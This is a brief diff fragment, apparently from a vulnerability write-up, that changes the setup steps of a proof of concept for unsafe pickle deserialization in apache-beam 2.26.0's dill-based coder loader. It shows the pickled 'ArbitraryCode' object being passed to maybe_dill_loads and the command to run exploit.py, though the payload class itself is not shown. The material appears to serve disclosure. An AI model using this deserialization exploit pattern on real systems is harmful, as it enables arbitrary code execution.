@@ -19,5 +19,5 @@ class ArbitraryCode:
 dumps = pickle.dumps(ArbitraryCode())
 coders.coders.maybe_dill_loads(dumps)
 ```
-* `pip3 install arq`
+* `pip3 install apache-beam==2.26.0`
 * `python3 exploit.py`
